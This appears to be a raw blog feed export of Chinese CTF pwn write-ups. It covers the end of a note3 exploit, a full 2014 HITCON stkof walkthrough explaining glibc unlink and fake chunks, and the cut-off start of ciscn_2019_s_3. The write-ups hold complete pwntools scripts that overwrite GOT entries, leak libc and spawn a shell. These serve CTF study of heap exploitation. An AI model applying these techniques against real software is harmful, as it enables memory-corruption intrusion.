class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./note3&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25662&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">length, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(less than 1024)&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editnote</span>(<span class="params"><span class="built_in">id</span>,data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;ent:&#x27;</span>)</span><br><span class="line">    io.sendline(data)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *0x400B31&#x27;)# new</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400BFB&#x27;) # delete</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400CDA&#x27;)#edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400C89&#x27;)</span></span><br><span class="line">ptr = <span class="number">0x6020C8</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xa1</span>) + p64(fakefd) + p64(fakebk) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">newnote(<span class="number">0x80</span>, content)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">16</span>)</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>,content)</span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>,payload)</span><br><span class="line">editnote(<span class="number">0</span>,p64(puts_plt)[:-<span class="number">1</span>])</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">rl()</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">editnote(<span class="number">2</span>,p64(system))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unlink </tag>
            
            <tag> Integer Overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unlink-2014-HITCON-stkof</title>
      <link href="/2023/03/14/Unlink-2014-HITCON-stkof/"/>
      <url>/2023/03/14/Unlink-2014-HITCON-stkof/</url>
      
        <content type="html"><![CDATA[<h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><p>在free堆块时，要满足释放的该chunk不在tcache(带着chunkhead，0x410)或fastbin(0x80)范围内，free的chunk物理地址前或后有freechunk时会进行unlink操作，unlink就是把这个chunk从双向链表里拿下来</p><p>调用关系大致如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line"><span class="built_in">free</span>()&#123;</span><br><span class="line">    _int_free()&#123;</span><br><span class="line">        unlink();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>unlink是一个宏</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    FD = P-&gt;fd;                                      </span><br><span class="line">    BK = P-&gt;bk;                                      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))              </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;                                      </span><br><span class="line">        FD-&gt;bk = BK;                                  </span><br><span class="line">        BK-&gt;fd = FD;                                  </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;              </span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      </span><br><span class="line">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">          malloc_printerr (check_action,      </span><br><span class="line">                   <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">                   P, AV);      </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                      </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              </span><br><span class="line">                <span class="keyword">else</span> &#123;                                  </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  </span><br><span class="line">                  &#125;                                  </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                  </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              </span><br><span class="line">              &#125;                                      </span><br><span class="line">          &#125;                                      </span><br><span class="line">      &#125;                                          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><p>Unlink这里会有几个检测</p><ul><li>检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</li><li>检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</li><li>经常被释放chunk的fd的bk是否指向p，被释放chunk的bk的fd是否指向p</li></ul><p>我们着重分析一下这里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD = P-&gt;fd;                                      </span><br><span class="line">BK = P-&gt;bk;                                      </span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))              </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line"><span class="keyword">else</span> &#123;                                      </span><br><span class="line">    FD-&gt;bk = BK;                                  </span><br><span class="line">    BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure><p>我们怎么绕过检测通过unlink实现任意地址读写呢</p><p>在64位程序下，我们被unlink的chunk是P</p><p>我们伪造chunk P </p><p>P-&gt;fd &#x3D; target addr -0x18</p><p>P-&gt;bk &#x3D; expect value</p><p>FD &#x3D; P-&gt;fd &#x3D; target-0x18</p><p>BK &#x3D; P-&gt;bk &#x3D; expect value</p><p><strong>FD-&gt;bk &#x3D; BK —&gt;*(target-0x18+0x18)&#x3D;*(P-&gt;fd+0x18)&#x3D;BK&#x3D;expect value</strong>      </p><p><strong>BK-&gt;fd &#x3D; FD —&gt;*(expect value+0x10)&#x3D;FD&#x3D;target-0x18&#x3D;P-&gt;fd</strong></p><p>实现了任意地址读写但是没有绕过 if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0)) malloc_printerr (check_action, “corrupted double-linked list”, P, AV); </p><p>也就是我们需要*(FD+0x18)&#x3D;P *(BK+0x10)&#x3D;P</p><p>如果我们可以在堆地址的某个地方伪造或者找到一个合适fake_chunk，这个chunk地址可以泄露出来，且符合&#x3D;P要求，我们把这个地址写到chunk P的fd和bk，在unlink时会发生什么呢</p><p>通过上面的分析，可以得知，</p><ul><li>第一步*(target)||*(P-&gt;fd+0x18)写入expect value||BK</li><li>第二步会在*(expect value+0x10)||*(p-&gt;bk+10)写入target-0x18||P-&gt;fd</li><li>如果我们可以控制这个地址内容，也就是可以using after free，通过修改该地址内容就可以实现hook</li></ul><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/p/heap&gt; checksec stkof</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/stkof&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序里有用的功能</p><ul><li>alloc分配内存，并写到bss段0x602140的全局数组里</li><li>free释放并置零指针，好评尼</li><li>fill填充申请堆区</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">fill</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  idx = atol(s);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !globals[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  size = atoll(s);</span><br><span class="line">  ptr = globals[idx];</span><br><span class="line">  <span class="keyword">for</span> ( i = fread(ptr, <span class="number">1uLL</span>, size, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1uLL</span>, size, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    size -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( size )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的fill是有漏洞的，我们可以限定大小的堆里写入任意大小的数据造成堆溢出</p><p><strong>堆溢出给了我们伪造unlink_chunk的机会，global指针数组给了我们伪造fd bk绕过检测的机会</strong></p><h3 id="缓冲区问题"><a href="#缓冲区问题" class="headerlink" title="缓冲区问题"></a>缓冲区问题</h3><p>alloc(16)<br>alloc(32)<br>alloc(48)</p><p>我们这里先alloc三个堆块</p><p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230314233831972.png" alt="image-20230314233831972"></p><p>这里发现多了两个堆块在alloc(16)中间，这是因为程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。在第一个malloc时，刚好有fget和printf</p><p>第一个chunk被包围不好利用，所以我们选择绕过第一个</p><h3 id="实现fill地址可控"><a href="#实现fill地址可控" class="headerlink" title="实现fill地址可控"></a>实现fill地址可控</h3><p>这里我们申请三个堆块，</p><p>alloc(0x10)<br>alloc(0x30)<br>alloc(0x80)</p><p>利用堆溢出，可以伪造unlink——chunk，我们选择在堆块二伪造</p><p>chunkhead需要0x10字节，fd bk需要0x10字节，后面数据需要0x10字节，第二个堆块至少0x30</p><p>第三个堆块需要在free的时候出发unlink操作，需要大于fastbin最大容量，申请0x80即可</p><ul><li>chunkhead伪造p64(0x0)+p64(0x30)即可</li><li>fd和bk这里我们需要FD-&gt;bk &#x3D; P &amp;&amp; BK-&gt;fd &#x3D; P<ul><li>这里我们可以利用globa指针数组里内容伪造双向链表</li><li>这时候我们的伪造unlink堆P&#x3D;0x0000000002c87450我们选取0x602138作为fd刚好满足FD-&gt;bk &#x3D; P</li><li><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315001634637.png" alt="image-20230315001634637"></li><li>选取0x602140作为bk刚好满足BK-&gt;fd &#x3D; P</li><li><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315001757168.png" alt="image-20230315001757168"></li><li>这里我们只需要关系FD的bk和BK的fd就好其他和我们unlink无关比如说我们FD的fd，我管你指向谁，我们不关心</li></ul></li></ul><p>payload&#x3D;p64(0x0)+p64(0x31)+p64(head+16-0x18)+p64(head+16-0x10)+p64(0x00)+p64(0x6666)</p><p>伪造好unlinkchunk，伪造chunk3，把prevsize改写为伪造chunk大小，把size <strong>PREV_INUSE</strong>位置零</p><p>payload +&#x3D; p64(0x30)+p64(0x90)</p><p>然后我们去释放chunk3 触发unlink</p><p>按照我们先前的分析</p><ul><li>先把fd+0x18&#x3D;0x602138+0x18&#x3D;0x602150地址写入bk&#x3D;0x602140</li><li>再把bk+0x10&#x3D;0x602140+0x10&#x3D;0x602150地址写入fd&#x3D;0x602138</li></ul><p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315002921373.png" alt="image-20230315002921373"></p><p>和分析一样</p><h3 id="任意地址读写，leak数据，拿shell走人"><a href="#任意地址读写，leak数据，拿shell走人" class="headerlink" title="任意地址读写，leak数据，拿shell走人"></a>任意地址读写，leak数据，拿shell走人</h3><p>这样我们fill chunk2时就可以，修改全局指针数组为任何地址，再通过fill修改这个地址为任何值</p><p>payload &#x3D; p64(0)+p64(free_got)+p64(puts_got)+p64(atoi_got)</p><p>edit(2,len(payload),payload)</p><p>这样s[0]&#x3D;free_got，s[1]&#x3D;puts_got，s[2]&#x3D;atoi_got</p><p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315005329559.png" alt="image-20230315005329559"></p><p>payload &#x3D; p64(puts_plt)<br>edit(0,len(payload),payload)<br>free(1)</p><p>先把freegot改为puts plt，这样free(1)&#x3D;&#x3D;puts(puts_got)</p><p>leak出libc后</p><p>payload &#x3D; p64(system)<br>edit(2,len(payload),payload)</p><p>把atoi_got改为system。利用choice &#x3D; atoi(nptr);在输入时构造binsh即可payload &#x3D; ‘&#x2F;bin&#x2F;sh\x00’<br>io.sendline(payload)</p><p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315010413491.png" alt="image-20230315010413491"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./stkof&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.send(content)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b* 0x4009E6&#x27;)#alloc</span></span><br><span class="line">db(<span class="string">&#x27;b* 0x400AE3&#x27;</span>)<span class="comment">#edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400BA7&#x27;) #free</span></span><br><span class="line">head=<span class="number">0x602140</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">payload=p64(<span class="number">0x0</span>)+p64(<span class="number">0x31</span>)+p64(head+<span class="number">16</span>-<span class="number">0x18</span>)+p64(head+<span class="number">16</span>-<span class="number">0x10</span>)+p64(<span class="number">0x00</span>)+p64(<span class="number">0x6666</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = p64(puts_plt)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line"><span class="built_in">bin</span>=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+base</span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果我们找到或伪造地址里面的值是伪造的chunkP的地址值</p><ul><li><p>一个地址</p><blockquote><p>我们把该地址tar，tar-0x18填入fd绕过FD+0x18&#x3D;P，tar-0x10填入bk绕过BK+0x10&#x3D;P</p><p>最终实现效果是在该tar地址写入tar-0x18</p></blockquote></li><li><p>两个地址</p><blockquote><p>tar1 和 tar2 tar1-0x18写入fd，tar2-0x10写入bk</p><p>tar1地址写入tar2-0x10|bk值</p><p>tar2地址写入tar1-0x18|fd值</p></blockquote></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_s_3</title>
      <link href="/2023/03/13/ciscn-2019-s-3/"/>
      <url>/2023/03/13/ciscn-2019-s-3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://files.buuoj.cn/files/5f9ef7ea96325fa7c9301560afeec679/ciscn_s_3">https://files.buuoj.cn/files/5f9ef7ea96325fa7c9301560afeec679/ciscn_s_3</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn$ checksec ciscn_2019_s_3</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/ciscn_2019_s_3&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h2><p>大体上main里只有vuln这一个函数，buf会溢出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004004ED</span><br><span class="line">.text:00000000004004ED                               ; __unwind &#123;</span><br><span class="line">.text:00000000004004ED 55                            push    rbp</span><br><span class="line">.text:00000000004004EE 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:00000000004004F1 48 31 C0                      xor     rax, rax</span><br><span class="line">.text:00000000004004F4 BA 00 04 00 00                mov     edx, 400h                       ; count</span><br><span class="line">.text:00000000004004F9 48 8D 74 24 F0                lea     rsi, [rsp+buf]                  ; buf</span><br><span class="line">.text:00000000004004FE 48 89 C7                      mov     rdi, rax                        ; fd</span><br><span class="line">.text:0000000000400501 0F 05                         syscall                                 ; LINUX - sys_read</span><br><span class="line">.text:0000000000400503 48 C7 